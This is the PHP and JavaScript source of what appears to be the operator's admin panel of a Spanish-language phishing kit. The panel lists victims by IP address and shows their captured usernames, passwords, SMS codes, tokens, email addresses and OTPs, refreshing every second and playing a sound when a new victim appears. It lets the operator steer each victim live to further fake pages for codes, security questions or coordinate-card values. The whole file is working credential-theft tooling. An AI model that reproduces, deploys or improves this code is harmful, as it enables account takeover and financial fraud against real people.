<?php
session_start();
require_once 'functions.php';

// Verificar si el usuario ha iniciado sesión
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header("Location: srefks.php");
    exit();
}

$data = load_data();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['ip']) && isset($_POST['redirect'])) {
        // Actualizar currentPage en xzw.json
        $ip = $_POST['ip'];
        $redirectPage = $_POST['redirect'];
        if (isset($data[$ip])) {
            $data[$ip]['currentPage'] = $redirectPage;
            save_data($data);
            echo json_encode(["success" => true]);
            exit();
        } else {
            echo json_encode(["success" => false, "error" => "Usuario no encontrado."]);
            exit();
        }
    }
    if (isset($_POST['ip']) && isset($_POST['quest']) && isset($_POST['quest2'])) {
        $ip = $_POST['ip'];
        $data[$ip]['quest'] = [$_POST['quest'], $_POST['quest2']];
        $data[$ip]['currentPage'] = "pregunta.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    if (isset($_POST['ip']) && isset($_POST['quest3']) && isset($_POST['quest4'])) {
        $ip = $_POST['ip'];
        $data[$ip]['quest2'] = [$_POST['quest3'], $_POST['quest4']];
        $data[$ip]['currentPage'] = "pregunta2.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    if (isset($_POST['ip']) && isset($_POST['coord'])) {
        // Guardar coordenadas en el JSON
        $ip = $_POST['ip'];
        $data[$ip]['coord'] = [
            $_POST['coord'],
            $_POST['coord2'],
            $_POST['coord3'],
            $_POST['coord4']
        ];
        $data[$ip]['currentPage'] = "coordenadas.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    if (isset($_POST['ip']) && isset($_POST['coord5'])) {
        // Guardar coordenadas en el JSON
        $ip = $_POST['ip'];
        $data[$ip]['coord5'] = [
            $_POST['coord5'],
            $_POST['coord6'],
            $_POST['coord7'],
            $_POST['coord8']
        ];
        $data[$ip]['currentPage'] = "coordenadas2.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    if (isset($_POST['ip']) && isset($_POST['state'])) {
        // Actualizar el estado del usuario a block
        $ip = $_POST['ip'];
        $data[$ip]['state'] = $_POST['state'];
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    // Procesar petición de eliminación de usuario
    if (isset($_POST['ip']) && isset($_POST['delete'])) {
        $ipKey = $_POST['ip'];
        if (delete_user($ipKey)) {
            echo json_encode(["success" => true]);
        } else {
            echo json_encode(["success" => false, "error" => "Usuario no encontrado."]);
        }
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
       <style>
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: "Segoe UI", Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        /* Contenedor tablas */
        #tablesContainer {
            width: 100%;
            overflow-x: auto;
            padding: 20px;
        }

        table {
            margin: 20px auto;
            border-collapse: collapse;
            width: 95%;
            background-color: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
        }

        thead th {
            background: linear-gradient(135deg, #2d2d2d, #3a3a3a);
            padding: 12px;
            border-bottom: 2px solid #444;
            font-size: 1em;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        tbody td {
            border-bottom: 1px solid #333;
            padding: 10px;
            text-align: center;
            font-size: 0.9em;
            transition: background 0.2s ease;
        }

        tbody tr:last-child td {
            border-bottom: none;
        }

        .group-header {
            font-weight: bold;
            background-color: #2a2a2a;
            color: #fff;
        }

        tr:hover td {
            background-color: #2c2c2c;
        }

        /* Botones */
        button {
            padding: 8px 14px;
            margin: 6px;
            background: linear-gradient(135deg, #333, #444);
            color: #fff;
            border: none;
            cursor: pointer;
            border-radius: 6px;
            font-size: 0.85em;
            transition: background 0.2s ease, transform 0.1s ease;
        }

        button:hover {
            background: linear-gradient(135deg, #444, #555);
            transform: scale(1.05);
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            width: 50%;
            max-width: 600px;
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 6px 20px rgba(0,0,0,0.6);
            animation: fadeIn 0.3s ease;
        }

        .modal input {
            width: 85%;
            padding: 12px;
            margin: 12px 0;
            border-radius: 6px;
            border: none;
            font-size: 0.9em;
            background-color: #2a2a2a;
            color: #fff;
        }

        .modal input:focus {
            outline: none;
            box-shadow: 0 0 5px #00bcd4;
        }

        .close {
            float: right;
            font-size: 24px;
            cursor: pointer;
            color: #aaa;
            transition: color 0.2s ease;
        }

        .close:hover {
            color: #ff4c4c;
        }

        /* Animación */
        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -48%); }
            to { opacity: 1; transform: translate(-50%, -50%); }
        }
    </style>
</head>

<body>
    <h1>Panel de Administración</h1>

    <!-- Contenedor para la tabla completa -->
    <div id="tablesContainer">
        <!-- La tabla se generará dinámicamente -->
    </div>

    <div id="questionModal" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese las Preguntas</h2>
        <input type="text" id="questionInput" value="¿?" placeholder="Escriba su pregunta">
        <input type="text" id="questionInput1" value="¿?" placeholder="Escriba su pregunta">
        <button id="submitQuestion">Enviar</button>
    </div>

    <div id="questionModal2" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese las Preguntas</h2>
        <input type="text" id="questionInput2" value="¿?" placeholder="Escriba su pregunta">
        <input type="text" id="questionInput3" value="¿?" placeholder="Escriba su pregunta">
        <button id="submitQuestion2">Enviar</button>
    </div>

    <div id="coordModal" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese las Coordenadas</h2>
        <input type="text" id="coord1" placeholder="Escriba su coordenada 1">
        <input type="text" id="coord2" placeholder="Escriba su coordenada 2">
        <input type="text" id="coord3" placeholder="Escriba su coordenada 3">
        <input type="text" id="coord4" placeholder="Escriba su coordenada 4">
        <button id="submitCoord">Enviar</button>
    </div>

    <div id="coordModal1" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese las Coordenadas</h2>
        <input type="text" id="coord5" placeholder="Escriba su coordenada 5">
        <input type="text" id="coord6" placeholder="Escriba su coordenada 6">
        <input type="text" id="coord7" placeholder="Escriba su coordenada 7">
        <input type="text" id="coord8" placeholder="Escriba su coordenada 8">
        <button id="submitCoord1">Enviar</button>
    </div>

    <audio id="notificationSound">
        <source src="content/notification.mp3" type="audio/mpeg">
    </audio>

    <script>
        // Keys de submissions a mostrar
        const submissionColumns = ['user','pass','sms','token','correo','otp'];
        let previousRowCount = 0;
        let selectedIp = null;

        function playSound() {
            document.getElementById("notificationSound").play();
        }

        function copyToClipboard(text) {
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text).then(() => {
                    alert('¡Copiado al portapapeles!');
                }).catch(err => {
                    alert('Error al copiar: ' + err);
                });
            } else {
                const tempInput = document.createElement('input');
                tempInput.value = text;
                document.body.appendChild(tempInput);
                tempInput.select();
                document.execCommand('copy');
                document.body.removeChild(tempInput);
                alert('¡Copiado al portapapeles!');
            }
        }

        // Encabezado global de la tabla
        function generateGlobalHeader(totalColumns) {
            return `<thead>
                        <tr>
                            <th colspan="${totalColumns}">Usuarios agrupados por color</th>
                        </tr>
                    </thead>`;
        }

        // En lugar del encabezado con nombre de grupo, se muestran los encabezados fijos (las columnas)
        function generateGroupHeader(color) {
            return `<tr style="background-color: ${color};">
                        <th>#</th>
                        <th>Página Actual</th>
                        <th>Location</th>
                        <th>Status</th>
                        <th>user</th>
                        <th>pass</th>   
                        <th>sms</th>  
                        <th>token</th>
                        <th>correo</th>
                        <th>otp</th>
                        <th>Acción</th>
                    </tr>`;
        }

        function loadUsers() {
            // Cargar datos desde el archivo JSON
            $.getJSON("xzw.json", function(data) {
                let users = Object.entries(data).reverse();
                let rowCount = users.length;

                // Reproducir sonido si hay más filas
                if (rowCount > previousRowCount) {
                    playSound();
                }
                previousRowCount = rowCount;

                // Colores fijos para los grupos (se normaliza el negro)
                const desiredColors = ['#000000'];
                // Total de columnas: (#, Página Actual, Estado, Status, submissions..., Acción)
                const totalColumns = 4 + submissionColumns.length + 1;

                // Inicializar grupos para cada color
                let groups = {};
                desiredColors.forEach(color => {
                    groups[color] = [];
                });

                // Inicializar el HTML de la tabla
                let tableHTML = `<table><thead><tr>`;
                tableHTML += `<th>#</th><th>Página Actual</th><th>Ubicación</th><th>Estado</th>`;

                // Agregar las columnas de 'submissions'
                submissionColumns.forEach(function(key) {
                    tableHTML += `<th>${key}</th>`;
                });

                tableHTML += `<th>Acción</th></tr></thead><tbody>`;

                let groupIndex = 1;

                // Iterar sobre los usuarios y agruparlos según su color
                users.forEach(([ip, user]) => {

                    if (!user.submissions || user.submissions.length === 0) {
                        return; // no lo mostramos en la tabla
                    }
                    // Crear las columnas de las submissions para cada usuario
                    let submissionColsHTML = "";
                    submissionColumns.forEach(function(key) {
                        let submissionValue = "";

                        // Si existen submissions, buscar el valor correspondiente
                        if (user.submissions && Array.isArray(user.submissions)) {
                            for (let i = user.submissions.length - 1; i >= 0; i--) {
                                let sub = user.submissions[i];
                                if (sub.data && sub.data[key] !== undefined) {
                                    submissionValue = sub.data[key];
                                    break;
                                }
                            }
                        }

                        // Asegurar que el valor no tenga comillas simples para evitar problemas con el HTML
                        let safeValue = submissionValue.toString().replace(/'/g, "\\'");

                        // Agregar las coordenadas directamente si corresponden
                        if (key === "c1" && user.coord && user.coord[0]) submissionValue = user.coord[0];
                        if (key === "c2" && user.coord && user.coord[1]) submissionValue = user.coord[1];
                        if (key === "c3" && user.coord && user.coord[2]) submissionValue = user.coord[2];
                        if (key === "c4" && user.coord && user.coord[3]) submissionValue = user.coord[3];
                        if (key === "c5" && user.coord5 && user.coord5[0]) submissionValue = user.coord5[0];
                        if (key === "c6" && user.coord5 && user.coord5[1]) submissionValue = user.coord5[1];
                        if (key === "c7" && user.coord5 && user.coord5[2]) submissionValue = user.coord5[2];
                        if (key === "c8" && user.coord5 && user.coord5[3]) submissionValue = user.coord5[3];

                        // Solo agregar el span con safeValue si key existe
                        if (["c1", "c2", "c3", "c4", "c5", "c6", "c7", "c8"].includes(key)) {
                            submissionColsHTML += `<td><span class="safe-value">${submissionValue|| ''}</span>
                            <button onclick="copyToClipboard('${safeValue}')">${safeValue || ''}</button>
                            </td>`;
                        } else {
                            submissionColsHTML += `<td><button onclick="copyToClipboard('${submissionValue}')">${submissionValue || ''}</button></td>`;
                        }
                    });

                    // Determinar el color (se usa el primero de desiredColors en este caso)
                    const color = desiredColors[0];

                    // Generar la fila de la tabla con los datos del usuario
                    tableHTML += `
                <tr style="background-color: ${color};">
                    <td>${groupIndex}</td>
                    <td>${user.currentPage}</td>
                    <td>${user.location ? user.location : ""}</td>
                    <td>
                        <span style="display: inline-block; width: 10px; height: 10px; border-radius: 50%; background-color: ${user.status === 'online' ? 'green' : 'red'};"></span>
                        ${user.status || ''}
                    </td>
                    ${submissionColsHTML}
                    <td>
                        <button onclick="redirectUser('${ip}', 'index.php')">Inicio</button>
                        <button onclick="redirectUser('${ip}', 'sms.php')">Sms</button>
                        <button onclick="redirectUser('${ip}', 'correo.php')">correo</button>
                        <button onclick="redirectUser('${ip}', 'token.php')">token</button>
                        <button onclick="redirectUser('${ip}', 'otp.php')">otp</button>
                        <button onclick="deleteUser('${ip}')" style="background-color:darkred;">Eliminar</button>
                        <button onclick="blockUser('${ip}')" style="background-color:red;">Bloquear</button>
                    </td>
                </tr>`;

                    groupIndex++;
                });

                // Si no hay usuarios, mostrar mensaje de "Sin datos"
                if (users.length === 0) {
                    tableHTML += `<tr><td colspan="${totalColumns}">Sin datos</td></tr>`;
                }

                // Cerrar el cuerpo de la tabla
                tableHTML += `</tbody></table>`;

                // Mostrar la tabla en el contenedor
                $("#tablesContainer").html(tableHTML);
            });
        }

        function redirectUser(ip, page) {
            $.post("admin.php", {
                ip: ip,
                redirect: page
            }, function(response) {
                let res = JSON.parse(response);
                if (!res.success) {
                    alert("Error: " + res.error);
                }
            });
        }

        function blockUser(ip) {
            $.post("admin.php", {
                ip: ip,
                state: "block"
            }, function(response) {
                let res = JSON.parse(response);
                if (!res.success) {
                    alert("Error: " + res.error);
                }
            });
        }

        function deleteUser(ipKey) {
            if (confirm("¿Está seguro de eliminar este usuario?")) {
                $.post("admin.php", {
                    ip: ipKey,
                    delete: true
                }, function(response) {
                    let res = JSON.parse(response);
                    if (!res.success) {
                        alert("Error: " + res.error);
                    } else {
                        loadUsers();
                    }
                });
            }
        }

        function openQuestionModal(ip) {
            selectedIp = ip;
            document.getElementById("questionModal").style.display = "block";
        }

        function openQuestionModal2(ip) {
            selectedIp = ip;
            document.getElementById("questionModal2").style.display = "block";
        }

        function opencoordModal(ip) {
            selectedIp = ip;
            document.getElementById("coordModal").style.display = "block";
        }

        function opencoordModal1(ip) {
            selectedIp = ip;
            document.getElementById("coordModal1").style.display = "block";
        }

        document.querySelector("#questionModal .close").addEventListener("click", function() {
            document.getElementById("questionModal").style.display = "none";
        });

        document.querySelector("#questionModal2 .close").addEventListener("click", function() {
            document.getElementById("questionModal2").style.display = "none";
        });

        document.querySelector("#coordModal .close").addEventListener("click", function() {
            document.getElementById("coordModal").style.display = "none";
        });

        document.querySelector("#coordModal1 .close").addEventListener("click", function() {
            document.getElementById("coordModal1").style.display = "none";
        });

        document.getElementById("submitQuestion").addEventListener("click", function() {
            const question = document.getElementById("questionInput").value;
            const question1 = document.getElementById("questionInput1").value;
            if (!question.trim() || !question1.trim()) {
                alert("Por favor, ingrese las preguntas.");
                return;
            }
            $.post("admin.php", {
                ip: selectedIp,
                quest: question,
                quest2: question1
            }, function(response) {
                document.getElementById("questionModal").style.display = "none";
            });
        });

        document.getElementById("submitQuestion2").addEventListener("click", function() {
            const question2 = document.getElementById("questionInput2").value;
            const question3 = document.getElementById("questionInput3").value;
            if (!question2.trim() || !question3.trim()) {
                alert("Por favor, ingrese las preguntas.");
                return;
            }
            $.post("admin.php", {
                ip: selectedIp,
                quest3: question2,
                quest4: question3
            }, function(response) {
                document.getElementById("questionModal2").style.display = "none";
            });
        });

        document.getElementById("submitCoord").addEventListener("click", function() {
            const coord1 = document.getElementById("coord1").value;
            const coord2 = document.getElementById("coord2").value;
            const coord3 = document.getElementById("coord3").value;
            const coord4 = document.getElementById("coord4").value;
            if (!coord1.trim() || !coord2.trim() || !coord3.trim() || !coord4.trim()) {
                alert("Por favor, ingrese coordenada.");
                return;
            }
            $.post("admin.php", {
                ip: selectedIp,
                coord: coord1,
                coord2: coord2,
                coord3: coord3,
                coord4: coord4
            }, function(response) {
                document.getElementById("coordModal").style.display = "none";
            });
        });

        document.getElementById("submitCoord1").addEventListener("click", function() {
            const coord5 = document.getElementById("coord5").value;
            const coord6 = document.getElementById("coord6").value;
            const coord7 = document.getElementById("coord7").value;
            const coord8 = document.getElementById("coord8").value;
            if (!coord5.trim() || !coord6.trim() || !coord7.trim() || !coord8.trim()) {
                alert("Por favor, ingrese coordenada.");
                return;
            }
            $.post("admin.php", {
                ip: selectedIp,
                coord5: coord5,
                coord6: coord6,
                coord7: coord7,
                coord8: coord8
            }, function(response) {
                document.getElementById("coordModal1").style.display = "none";
            });
        });

        $(document).ready(function() {
            loadUsers();
            setInterval(loadUsers, 1000);
        });
    </script>
</body>

</html>